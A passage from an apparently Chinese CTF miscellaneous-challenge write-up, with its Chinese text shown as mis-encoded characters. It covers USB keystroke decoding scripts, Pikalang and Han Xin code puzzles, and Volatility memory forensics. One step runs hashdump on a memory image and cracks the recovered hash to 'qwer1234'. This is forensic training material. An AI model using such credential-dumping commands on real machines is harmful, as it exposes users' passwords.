class="string">&quot;0f&quot;</span>:<span class="string">&quot;L&quot;</span>, <span class="string">&quot;10&quot;</span>:<span class="string">&quot;M&quot;</span>, <span class="string">&quot;11&quot;</span>:<span class="string">&quot;N&quot;</span>, <span class="string">&quot;12&quot;</span>:<span class="string">&quot;O&quot;</span>,</span><br><span class="line"> <span class="string">&quot;13&quot;</span>:<span class="string">&quot;P&quot;</span>, <span class="string">&quot;14&quot;</span>:<span class="string">&quot;Q&quot;</span>, <span class="string">&quot;15&quot;</span>:<span class="string">&quot;R&quot;</span>, <span class="string">&quot;16&quot;</span>:<span class="string">&quot;S&quot;</span>, <span class="string">&quot;17&quot;</span>:<span class="string">&quot;T&quot;</span>,</span><br><span class="line"> <span class="string">&quot;18&quot;</span>:<span class="string">&quot;U&quot;</span>, <span class="string">&quot;19&quot;</span>:<span class="string">&quot;V&quot;</span>, <span class="string">&quot;1a&quot;</span>:<span class="string">&quot;W&quot;</span>, <span class="string">&quot;1b&quot;</span>:<span class="string">&quot;X&quot;</span>, <span class="string">&quot;1c&quot;</span>:<span class="string">&quot;Y&quot;</span>,</span><br><span class="line"> <span class="string">&quot;1d&quot;</span>:<span class="string">&quot;Z&quot;</span>,<span class="string">&quot;1e&quot;</span>:<span class="string">&quot;!&quot;</span>, <span class="string">&quot;1f&quot;</span>:<span class="string">&quot;@&quot;</span>, <span class="string">&quot;20&quot;</span>:<span class="string">&quot;#&quot;</span>, <span class="string">&quot;21&quot;</span>:<span class="string">&quot;$&quot;</span>,</span><br><span class="line"> <span class="string">&quot;22&quot;</span>:<span class="string">&quot;%&quot;</span>, <span class="string">&quot;23&quot;</span>:<span class="string">&quot;^&quot;</span>,<span class="string">&quot;24&quot;</span>:<span class="string">&quot;&amp;&quot;</span>,<span class="string">&quot;25&quot;</span>:<span class="string">&quot;*&quot;</span>,<span class="string">&quot;26&quot;</span>:<span class="string">&quot;(&quot;</span>,<span class="string">&quot;27&quot;</span>:<span class="string">&quot;)&quot;</span>,</span><br><span class="line"> <span class="string">&quot;28&quot;</span>:<span class="string">&quot;&lt;RET&gt;&quot;</span>,<span class="string">&quot;29&quot;</span>:<span class="string">&quot;&lt;ESC&gt;&quot;</span>,<span class="string">&quot;2a&quot;</span>:<span class="string">&quot;&lt;DEL&gt;&quot;</span>, <span class="string">&quot;2b&quot;</span>:<span class="string">&quot;\t&quot;</span>,<span class="string">&quot;2c&quot;</span>:<span class="string">&quot;&lt;SPACE&gt;&quot;</span>,</span><br><span class="line"> <span class="string">&quot;2d&quot;</span>:<span class="string">&quot;_&quot;</span>,<span class="string">&quot;2e&quot;</span>:<span class="string">&quot;+&quot;</span>,<span class="string">&quot;2f&quot;</span>:<span class="string">&quot;&#123;&quot;</span>,<span class="string">&quot;30&quot;</span>:<span class="string">&quot;&#125;&quot;</span>,<span class="string">&quot;31&quot;</span>:<span class="string">&quot;|&quot;</span>,<span class="string">&quot;32&quot;</span>:<span class="string">&quot;&lt;NON&gt;&quot;</span>,<span class="string">&quot;33&quot;</span>:<span class="string">&quot;\&quot;&quot;</span>,</span><br><span class="line"> <span class="string">&quot;34&quot;</span>:<span class="string">&quot;:&quot;</span>,<span class="string">&quot;35&quot;</span>:<span class="string">&quot;&lt;GA&gt;&quot;</span>,<span class="string">&quot;36&quot;</span>:<span class="string">&quot;&lt;&quot;</span>,<span class="string">&quot;37&quot;</span>:<span class="string">&quot;&gt;&quot;</span>,<span class="string">&quot;38&quot;</span>:<span class="string">&quot;?&quot;</span>,<span class="string">&quot;39&quot;</span>:<span class="string">&quot;&lt;CAP&gt;&quot;</span>,<span class="string">&quot;3a&quot;</span>:<span class="string">&quot;&lt;F1&gt;&quot;</span>,</span><br><span class="line"> <span class="string">&quot;3b&quot;</span>:<span class="string">&quot;&lt;F2&gt;&quot;</span>, <span class="string">&quot;3c&quot;</span>:<span class="string">&quot;&lt;F3&gt;&quot;</span>,<span class="string">&quot;3d&quot;</span>:<span class="string">&quot;&lt;F4&gt;&quot;</span>,<span class="string">&quot;3e&quot;</span>:<span class="string">&quot;&lt;F5&gt;&quot;</span>,<span class="string">&quot;3f&quot;</span>:<span class="string">&quot;&lt;F6&gt;&quot;</span>,<span class="string">&quot;40&quot;</span>:<span class="string">&quot;&lt;F7&gt;&quot;</span>,</span><br><span class="line"> <span class="string">&quot;41&quot;</span>:<span class="string">&quot;&lt;F8&gt;&quot;</span>,<span class="string">&quot;42&quot;</span>:<span class="string">&quot;&lt;F9&gt;&quot;</span>,<span class="string">&quot;43&quot;</span>:<span class="string">&quot;&lt;F10&gt;&quot;</span>,<span class="string">&quot;44&quot;</span>:<span class="string">&quot;&lt;F11&gt;&quot;</span>,<span class="string">&quot;45&quot;</span>:<span class="string">&quot;&lt;F12&gt;&quot;</span>&#125;</span><br><span class="line">output = []</span><br><span class="line">keys = <span class="built_in">open</span>(<span class="string">&#x27;output_x.txt&#x27;</span>) <span class="comment"># ä¿®æ”¹æ–‡ä»¶åè¿›è¡Œè¿è¡Œ</span></span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> keys:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> line[<span class="number">0</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> (line[<span class="number">1</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">and</span> line[<span class="number">1</span>]!=<span class="string">&#x27;2&#x27;</span>) <span class="keyword">or</span> line[<span class="number">3</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">4</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">9</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">10</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">12</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">13</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">15</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">16</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">18</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">19</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">21</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">22</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">6</span>:<span class="number">8</span>]==<span class="string">&quot;00&quot;</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">if</span> line[<span class="number">6</span>:<span class="number">8</span>] <span class="keyword">in</span> normalKeys.keys():</span><br><span class="line">            output += [[normalKeys[line[<span class="number">6</span>:<span class="number">8</span>]]],[shiftKeys[line[<span class="number">6</span>:<span class="number">8</span>]]]][line[<span class="number">1</span>]==<span class="string">&#x27;2&#x27;</span>]</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            output += [<span class="string">&#x27;[unknown]&#x27;</span>]</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">keys.close()</span><br><span class="line"></span><br><span class="line">flag=<span class="number">0</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&quot;</span>.join(output))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(output)):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        a=output.index(<span class="string">&#x27;&lt;DEL&gt;&#x27;</span>)</span><br><span class="line">        <span class="keyword">del</span> output[a]</span><br><span class="line">        <span class="keyword">del</span> output[a-<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(output)):</span><br><span class="line">     <span class="keyword">try</span>:</span><br><span class="line">         <span class="keyword">if</span> output[i]==<span class="string">&quot;&lt;CAP&gt;&quot;</span>:</span><br><span class="line">             flag+=<span class="number">1</span></span><br><span class="line">             output.pop(i)</span><br><span class="line">             <span class="keyword">if</span> flag==<span class="number">2</span>:</span><br><span class="line">                flag=<span class="number">0</span></span><br><span class="line">         <span class="keyword">if</span> flag!=<span class="number">0</span>:</span><br><span class="line">            output[i]=output[i].upper()</span><br><span class="line">     <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;output :&#x27;</span> + <span class="string">&quot;&quot;</span>.join(output))</span><br></pre></td></tr></table></figure>

<p>åˆ†åˆ«å¯¹ä¸‰ä¸ªæ–‡æœ¬è¿›è¡Œå¤„ç†ï¼Œæœ€å2_4æ²¡è·‘å‡ºæ•°æ®ï¼Œ2_8&#x2F;2_10è·‘å‡ºæ•°æ®</p>
<img src="/2023/03/09/MISC-Write-Up-zh/image-20220817154125683.png" class="" title="image-20220817154125683">

<h2 id="16è¿›åˆ¶-x2F-å·²çŸ¥æ–‡ä»¶å¤´å°†è¾“å‡ºæ•°æ®è½¬æ¢ä¸ºå‹ç¼©åŒ…ï¼Œå¹¶è§£å¯†"><a href="#16è¿›åˆ¶-x2F-å·²çŸ¥æ–‡ä»¶å¤´å°†è¾“å‡ºæ•°æ®è½¬æ¢ä¸ºå‹ç¼©åŒ…ï¼Œå¹¶è§£å¯†" class="headerlink" title="16è¿›åˆ¶&#x2F;å·²çŸ¥æ–‡ä»¶å¤´å°†è¾“å‡ºæ•°æ®è½¬æ¢ä¸ºå‹ç¼©åŒ…ï¼Œå¹¶è§£å¯†"></a>16è¿›åˆ¶&#x2F;å·²çŸ¥æ–‡ä»¶å¤´å°†è¾“å‡ºæ•°æ®è½¬æ¢ä¸ºå‹ç¼©åŒ…ï¼Œå¹¶è§£å¯†</h2><ol>
<li>16è¿›åˆ¶è½¬æ¢</li>
</ol>
<blockquote>
<p><a href="https://the-x.cn/encodings/Hex.aspx">https://the-x.cn/encodings/Hex.aspx</a></p>
</blockquote>
<img src="/2023/03/09/MISC-Write-Up-zh/image-20220817154843391.png" class="" title="image-20220817154843391">

<ol start="2">
<li>winhex</li>
</ol>
<img src="/2023/03/09/MISC-Write-Up-zh/image-20220817155055041.png" class="" title="image-20220817155055041">

<ol start="3">
<li>ç”Ÿæˆå‹ç¼©åŒ…åï¼Œè§£å‹ï¼Œä½¿ç”¨æ‰€å¾—å¯†é’¥<code>35c535765e50074a</code>è¿›è¡Œè§£å¯†ï¼Œå¾—åˆ°<code>flag&#123;20de17cc-d2c1-4b61-bebd-41159ed7172d&#125;</code></li>
</ol>
<h1 id="å›½èµ›-pikalang"><a href="#å›½èµ›-pikalang" class="headerlink" title="[å›½èµ›]pikalang"></a>[å›½èµ›]pikalang</h1><ol>
<li><code>stegsolve</code>å¯¹<code>pika.png</code>è¿›è¡Œé€šé“æ£€æŸ¥</li>
</ol>
<img src="/2023/03/09/MISC-Write-Up-zh/image-20220921101021224.png" class="" title="image-20220921101021224">

<ol start="2">
<li>æå–å‡ºæ¥çš„æ•°æ®è¿›è¡Œbase64è§£å¯†ï¼Œå¾—åˆ°<code>pikalang</code>å¯†æ–‡</li>
</ol>
<img src="/2023/03/09/MISC-Write-Up-zh/image-20220921101119449.png" class="" title="image-20220921101119449">

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cGkgcGkgcGkgcGkgcGkgcGkgcGkgcGkgcGkgcGkgcGlrYSBwaXBpIHBpIHBpcGkgcGkgcGkgcGkgcGlwaSBwaSBwaSBwaSBwaSBwaSBwaSBwaSBwaXBpIHBpIHBpIHBpIHBpIHBpIHBpIHBpIHBpIHBpIHBpIHBpY2h1IHBpY2h1IHBpY2h1IHBpY2h1IGthIGNodSBwaXBpIHBpcGkgcGlwaSBwaXBpIHBpIHBpIHBpa2FjaHUgcGkgcGkgcGkgcGkgcGkgcGkgcGlrYWNodSBrYSBrYSBrYSBrYSBrYSBrYSBrYSBrYSBrYSBrYSBrYSBwaWthY2h1IHBpIHBpIHBpIHBpIHBpIHBpIHBpa2FjaHUgcGkgcGkgcGkgcGkgcGkgcGkgcGkgcGkgcGkgcGkgcGkgcGkgcGkgcGkgcGkgcGkgcGkgcGkgcGkgcGkgcGlrYWNodSBrYSBrYSBrYSBrYSBrYSBrYSBrYSBrYSBrYSBrYSBrYSBrYSBrYSBrYSBrYSBrYSBrYSBrYSBrYSBrYSBrYSBrYSBrYSBwaWthY2h1IHBpY2h1IGthIGthIGthIGthIGthIGthIGthIGthIGthIGthIGthIGthIGthIGthIGthIGthIHBpa2FjaHUga2Ega2Ega2Ega2EgcGlrYWNodSBwaSBwaSBwaWthY2h1IHBpIHBpIHBpa2FjaHUgcGlwaSBwaWthY2h1IHBpY2h1IGthIGthIGthIGthIGthIHBpa2FjaHUgcGlwaSBwaSBwaSBwaWthY2h1IHBpY2h1IHBpIHBpIHBpIHBpa2FjaHUga2Ega2Ega2EgcGlrYWNodSBwaXBpIHBpa2FjaHUga2Ega2Ega2Ega2Ega2EgcGlrYWNodSBwaSBwaSBwaSBwaWthY2h1IHBpY2h1IGthIHBpa2FjaHUgcGkgcGkgcGkgcGlrYWNodSBrYSBwaWthY2h1IHBpcGkgcGkgcGlrYWNodSBwaWthY2h1IHBpY2h1IHBpIHBpa2FjaHUga2Ega2Ega2EgcGlrYWNodSBwaSBwaWthY2h1IHBpIHBpIHBpIHBpIHBpIHBpIHBpIHBpIHBpa2FjaHUga2Ega2Ega2Ega2Ega2Ega2EgcGlrYWNodSBwaXBpIHBpIHBpa2FjaHUgcGljaHUgcGlrYWNodSBwaXBpIGthIGthIGthIGthIGthIHBpa2FjaHUgcGkgcGkgcGkgcGkgcGkgcGlrYWNodSBwaWNodSBrYSBrYSBwaWthY2h1IHBpIHBpIHBpIHBpIHBpa2FjaHUga2EgcGlrYWNodSBrYSBrYSBrYSBrYSBwaWthY2h1IHBpIHBpIHBpIHBpIHBpIHBpIHBpIHBpIHBpa2FjaHUgcGlwaSBwaSBwaSBwaSBwaSBwaSBwaSBwaSBwaSBwaSBwaSBwaSBwaSBwaSBwaSBwaSBwaSBwaSBwaSBwaSBwaSBwaSBwaSBwaSBwaWthY2h1IA==</span><br></pre></td></tr></table></figure>

<ol start="3">
<li>å¼•å…¥ç¬¬ä¸‰æ–¹åº“<code>pikalang</code>ï¼Œæœ€åä½¿ç”¨pokeballç¼–å†™è„šæœ¬</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># import pikalang</span></span><br><span class="line"></span><br><span class="line">sourcecode = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">pi pi pi pi pi pi pi pi pi pi pika pipi pi pipi pi pi pi pipi pi pi pi pi pi pi pi pipi pi pi pi pi pi pi pi pi pi pi pichu pichu pichu pichu ka chu pipi pipi pipi pipi pi pi pikachu pi pi pi pi pi pi pikachu ka ka ka ka ka ka ka ka ka ka ka pikachu pi pi pi pi pi pi pikachu pi pi pi pi pi pi pi pi pi pi pi pi pi pi pi pi pi pi pi pi pikachu ka ka ka ka ka ka ka ka ka ka ka ka ka ka ka ka ka ka ka ka ka ka ka pikachu pichu ka ka ka ka ka ka ka ka ka ka ka ka ka ka ka ka pikachu ka ka ka ka pikachu pi pi pikachu pi pi pikachu pipi pikachu pichu ka ka ka ka ka pikachu pipi pi pi pikachu pichu pi pi pi pikachu ka ka ka pikachu pipi pikachu ka ka ka ka ka pikachu pi pi pi pikachu pichu ka pikachu pi pi pi pikachu ka pikachu pipi pi pikachu pikachu pichu pi pikachu ka ka ka pikachu pi pikachu pi pi pi pi pi pi pi pi pikachu ka ka ka ka ka ka pikachu pipi pi pikachu pichu pikachu pipi ka ka ka ka ka pikachu pi pi pi pi pi pikachu pichu ka ka pikachu pi pi pi pi pikachu ka pikachu ka ka ka ka pikachu pi pi pi pi pi pi pi pi pikachu pipi pi pi pi pi pi pi pi pi pi pi pi pi pi pi pi pi pi pi pi pi pi pi pi pikachu</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># or use sourcecode = pikalang.load_source(&quot;pika.pokeball&quot;) to load from file</span></span><br><span class="line"></span><br><span class="line">pikalang.evaluate(sourcecode)</span><br><span class="line"></span><br></pre></td></tr></table></figure>





<h1 id="ç½‘é¼æ¯-2020-é’é¾™ç»„-è™šå¹»2"><a href="#ç½‘é¼æ¯-2020-é’é¾™ç»„-è™šå¹»2" class="headerlink" title="[ç½‘é¼æ¯ 2020 é’é¾™ç»„]è™šå¹»2"></a>[ç½‘é¼æ¯ 2020 é’é¾™ç»„]è™šå¹»2</h1><blockquote>
<p>è§£å‹ç¼©å¾—åˆ°<code>file </code></p>
<p>toolsï¼š</p>
<ol>
<li>winhex</li>
<li>ä¸­å›½ç¼–ç APP</li>
<li>pycharm</li>
</ol>
<p>hintï¼š</p>
<ol>
<li>æ±‰ä¿¡ç </li>
<li>çˆ†ç ´</li>
</ol>
</blockquote>
<ol>
<li>ä½¿ç”¨<code>winhex</code>å‘ç°æ–‡ä»¶å¤´æ˜¯PNGï¼Œæ‰€ä»¥æŠŠåç¼€åä¿®æ”¹ï¼Œå¾—åˆ°<code>file.png</code></li>
<li>å°†<code>file.png</code>è¿›è¡Œè¯»å–ï¼Œå¾—åˆ°<code>01</code>å­—ç¬¦ä¸²</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># è¯»å–åƒç´ ç‚¹</span></span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line">x = <span class="number">36</span>	  <span class="comment">#xåæ ‡</span></span><br><span class="line">y = <span class="number">12</span>	  <span class="comment">#yåæ ‡</span></span><br><span class="line"></span><br><span class="line">im=Image.<span class="built_in">open</span>(<span class="string">&#x27;file.png&#x27;</span>)</span><br><span class="line">file = <span class="built_in">open</span>(<span class="string">&#x27;11&#x27;</span>, <span class="string">&#x27;w&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#im.show()</span></span><br><span class="line">z=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, x):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, y):</span><br><span class="line">        rgb=im.getpixel((i, j))</span><br><span class="line">        <span class="built_in">print</span>(rgb)</span><br><span class="line">        <span class="keyword">if</span>(rgb[<span class="number">0</span>]==<span class="number">0</span>):</span><br><span class="line">            z+=<span class="string">&#x27;1&#x27;</span></span><br><span class="line">        <span class="keyword">elif</span>(rgb[<span class="number">0</span>]==<span class="number">255</span>):</span><br><span class="line">            z+=<span class="string">&#x27;0&#x27;</span></span><br><span class="line">        <span class="keyword">if</span>(rgb[<span class="number">1</span>]==<span class="number">0</span>):</span><br><span class="line">            z+=<span class="string">&#x27;1&#x27;</span></span><br><span class="line">        <span class="keyword">elif</span>(rgb[<span class="number">1</span>]==<span class="number">255</span>):</span><br><span class="line">            z+=<span class="string">&#x27;0&#x27;</span></span><br><span class="line">        <span class="keyword">if</span>(rgb[<span class="number">2</span>]==<span class="number">0</span>):</span><br><span class="line">            z+=<span class="string">&#x27;1&#x27;</span></span><br><span class="line">        <span class="keyword">elif</span>(rgb[<span class="number">2</span>]==<span class="number">255</span>):</span><br><span class="line">            z+=<span class="string">&#x27;0&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(z)</span><br><span class="line">file.write(z)</span><br></pre></td></tr></table></figure>

<ol start="3">
<li>å°†<code>01</code>å­—ç¬¦ä¸²å†™å…¥å›¾ç‰‡ï¼Œå¾—åˆ°ç¼ºå¤±ä¸€å—çš„æ±‰ä¿¡ç ã€‚</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># å†™å…¥æˆä¸ºå›¾ç‰‡</span></span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line">x = <span class="number">36</span>	  <span class="comment">#xåæ ‡</span></span><br><span class="line">y = <span class="number">36</span>	  <span class="comment">#yåæ ‡</span></span><br><span class="line"></span><br><span class="line">im = Image.new(<span class="string">&quot;RGB&quot;</span>, (x, y))</span><br><span class="line">file = <span class="built_in">open</span>(<span class="string">&#x27;11&#x27;</span>, <span class="string">&#x27;r&#x27;</span>)</span><br><span class="line"></span><br><span class="line">a=file.read()</span><br><span class="line">z=<span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, x):</span><br><span class="line">	<span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, y):</span><br><span class="line">		<span class="built_in">print</span>(a[z])</span><br><span class="line">		<span class="keyword">if</span>(a[z]==<span class="string">&#x27;1&#x27;</span>):</span><br><span class="line">			im.putpixel((i, j), (<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>))</span><br><span class="line">		<span class="keyword">elif</span>(a[z]==<span class="string">&#x27;0&#x27;</span>):</span><br><span class="line">			im.putpixel((i, j), (<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>))</span><br><span class="line">		z=z+<span class="number">1</span></span><br><span class="line"></span><br><span class="line">im.show()</span><br><span class="line">im.save(<span class="string">&#x27;Hanxin.png&#x27;</span>)</span><br></pre></td></tr></table></figure>

<img src="/2023/03/09/MISC-Write-Up-zh/image-20220825161005347.png" class="" title="image-20220825161005347">

<ol start="4">
<li>ç¨å¾®è¡¥å……ç‚¹ï¼Œç„¶åè®©æ±‰ä¿¡ç è‡ªåŠ¨æ ¡æ­£ã€‚å¾—åˆ°<code>flag&#123;eed70c7d-e530-49ba-ad45-80fdb7872e0a&#125;</code></li>
</ol>
<h1 id="ç”µå­æ•°æ®å–è¯-Volatility"><a href="#ç”µå­æ•°æ®å–è¯-Volatility" class="headerlink" title="ç”µå­æ•°æ®å–è¯-Volatility"></a>ç”µå­æ•°æ®å–è¯-Volatility</h1><h2 id="1-Suspicion"><a href="#1-Suspicion" class="headerlink" title="1. Suspicion"></a>1. Suspicion</h2><blockquote>
<p>è§£å‹ç¼©å¾—åˆ°mem.vmem suspious</p>
<p>toolsï¼š</p>
<ol>
<li>vol.py</li>
<li>Elcomsoft Forensic Disk Decryptorï¼ˆEFDDï¼‰</li>
</ol>
</blockquote>
<ol>
<li>é€šè¿‡<code>vol.py -f mem.vmem imageinfo</code>è·å¾—åŸºæœ¬ä¿¡æ¯</li>
</ol>
<img src="/2023/03/09/MISC-Write-Up-zh/image-20220822164245671.png" class="" title="image-20220822164245671">

<ol start="2">
<li>é€šè¿‡<code>vol.py -f mem.vmem --profile=WinXPSP2x86 pstree</code>ï¼Œå¾—åˆ°åŠ å¯†è¿›ç¨‹<code>TrueCrypt.exe</code>ï¼Œæ¨æ–­<code>suspious</code>æ˜¯åŠ å¯†åçš„æ•°æ®</li>
</ol>
<img src="/2023/03/09/MISC-Write-Up-zh/image-20220822164457784.png" class="" title="image-20220822164457784">

<ol start="3">
<li>é€šè¿‡<code>vol.py -f mem.vmem --profile=WinXPSP2x86 memdump -p 2012 -D ./</code>ï¼ˆ-pä¸ºPIDï¼Œ-Dæ˜¯è½¬å‚¨è·¯å¾„ï¼‰</li>
</ol>
<img src="/2023/03/09/MISC-Write-Up-zh/image-20220825135521302.png" class="" title="image-20220825135521302">

<ol start="4">
<li>ä½¿ç”¨<code>EFDD</code>å¯¹<code>2012.dmp</code>è¿›è¡Œè§£å¯†ä»¥åŠæŒ‚è½½ã€‚</li>
</ol>
<img src="/2023/03/09/MISC-Write-Up-zh/image-20220825140011253.png" class="" title="image-20220825140011253">

<img src="/2023/03/09/MISC-Write-Up-zh/image-20220825140028921.png" class="" title="image-20220825140028921">

<img src="/2023/03/09/MISC-Write-Up-zh/image-20220825140238242.png" class="" title="image-20220825140238242">

<img src="/2023/03/09/MISC-Write-Up-zh/image-20220825140342485.png" class="" title="image-20220825140342485">

<img src="/2023/03/09/MISC-Write-Up-zh/image-20220825140421572.png" class="" title="image-20220825140421572">

<p>è¿›è¡ŒæŒ‚è½½æ“ä½œã€‚</p>
<img src="/2023/03/09/MISC-Write-Up-zh/image-20220825140704331.png" class="" title="image-20220825140704331">

<ol start="5">
<li>æŸ¥çœ‹æŒ‚è½½åçš„æ•°æ®ï¼Œæ‰¾åˆ°<code>PCTF&#123;T2reCrypt_15_N07_S3cu2e&#125;</code></li>
</ol>
<img src="/2023/03/09/MISC-Write-Up-zh/image-20220825140814805.png" class="" title="image-20220825140814805">

<h2 id="2-æ¹–æ¹˜æ¯2020-passwd"><a href="#2-æ¹–æ¹˜æ¯2020-passwd" class="headerlink" title="2. [æ¹–æ¹˜æ¯2020] passwd"></a>2. [æ¹–æ¹˜æ¯2020] passwd</h2><blockquote>
<p>è§£å‹ç¼©å¾—åˆ°<code>WIN-BU6IJ7FI9RU-20190927-152050.raw</code></p>
<p>MD5è§£å¯†</p>
</blockquote>
<ol>
<li>ä¾æ—§æŸ¥çœ‹åŸºæœ¬ä¿¡æ¯<code>vol.py -f WIN-BU6IJ7FI9RU-20190927-152050.raw imageinfo</code></li>
</ol>
<img src="/2023/03/09/MISC-Write-Up-zh/image-20220825142251600.png" class="" title="image-20220825142251600">

<ol start="2">
<li>æŸ¥çœ‹hashå€¼<code>vol.py -f WIN-BU6IJ7FI9RU-20190927-152050.raw --profile=Win7SP1x86_23418 hashdump</code></li>
</ol>
<img src="/2023/03/09/MISC-Write-Up-zh/image-20220825142421951.png" class="" title="image-20220825142421951">

<ol start="3">
<li>ä½¿ç”¨MD5ç½‘ç«™è¿›è¡Œè§£å¯†ï¼Œå¾—åˆ°<code>qwer1234</code></li>
</ol>
<img src="/2023/03/09/MISC-Write-Up-zh/image-20220825142616849.png" class="" title="image-20220825142616849">

<h2 id="3-NEWSCTF2021-very-ez-dump"><a href="#3-NEWSCTF2021-very-ez-dump" class="headerlink" title="3. [NEWSCTF2021] very-ez-dump"></a>3. [NEWSCTF2021] very-ez-dump</h2><blockquote>
<p>è§£å‹ç¼©å¾—åˆ°<code>mem.raw</code></p>
</blockquote>
<ol>
<li>æŸ¥çœ‹é•œåƒä¿¡æ¯<code>vol.py -f mem.raw imageinfo</code></li>
</ol>
<img src="/2023/03/09/MISC-Write-Up-zh/image-20220825143021996.png" class="" title="image-20220825143021996">

<ol start="2">
<li>æŸ¥çœ‹cmdæ‰€æ‰§è¡Œçš„ç›¸å…³å‘½ä»¤ï¼Œå‘ç°æ·»åŠ äº†ä¸€ä¸ªç”¨æˆ·<code>mumuzi</code>ä¸”å¯†ç ä¸º<code>(ljmmz)ovo</code></li>
</ol>
<img src="/2023/03/09/MISC-Write-Up-zh/image-20220825143310111.png" class="" title="image-20220825143310111">

<ol start="3">
<li>æŸ¥æ‰¾flagå…³é”®è¯<code>vol.py -f mem.raw --profile=Win7SP1x64 filescan | grep flag</code>ï¼Œå‘ç°<code>flag.zip</code>è¿›è¡Œè½¬å‚¨<code>vol.py -f mem.raw --profile=Win7SP1x64 dumpfiles -Q 0x000000003e4b2070 -D ./</code>ï¼ˆ-Qä¸ºåœ°å€ï¼Œ-Dä¸ºè½¬å‚¨è·¯å¾„ï¼‰</li>
</ol>
<img src="/2023/03/09/MISC-Write-Up-zh/image-20220825143446485.png" class="" title="image-20220825143446485">

<ol start="4">
<li>ç”¨<code>winhex</code>å‘ç°åº”è¯¥æ˜¯<code>zip</code>ï¼Œä¿®æ”¹åç¼€åï¼Œå‘ç°å‹ç¼©åŒ…è¿›è¡ŒçœŸåŠ å¯†ï¼Œå¹¶ä¸”éœ€è¦ç›¸åº”çš„å¯†ç ã€‚</li>
</ol>
<img src="/2023/03/09/MISC-Write-Up-zh/image-20220825143834446.png" class="" title="image-20220825143834446">

<ol start="5">
<li>ç”¨2ä¸­å¾—åˆ°çš„å¯†ç å¯¹å‹ç¼©åŒ…è¿›è¡Œè§£å¯†ï¼Œæœ€åè§£å¯†å¾—åˆ°<code>flag&#123;ez_di_imp_1t_y0u_like?&#125;</code></li>
</ol>
<h2 id="5-HDCTF2019-ä½ èƒ½å‘ç°ä»€ä¹ˆè››ä¸é©¬è¿¹å—"><a href="#5-HDCTF2019-ä½ èƒ½å‘ç°ä»€ä¹ˆè››ä¸é©¬è¿¹å—" class="headerlink" title="5. [HDCTF2019]ä½ èƒ½å‘ç°ä»€ä¹ˆè››ä¸é©¬è¿¹å—"></a>5. [HDCTF2019]ä½ èƒ½å‘ç°ä»€ä¹ˆè››ä¸é©¬è¿¹å—</h2><blockquote>
<p>è§£å‹ç¼©å¾—åˆ°<code>memory.img</code></p>
<p>toolsï¼š</p>
<ol>
<li>volatility</li>
</ol>
</blockquote>
<ol>
<li>æ­£å¸¸æµç¨‹ï¼Œå…ˆçœ‹å…·ä½“é‡Œé¢å†…å®¹<code>vol.py -f memory.img imageinfo</code></li>
</ol>
<img src="/2023/03/09/MISC-Write-Up-zh/image-20220825103409801.png" class="" title="image-20220825103409801">

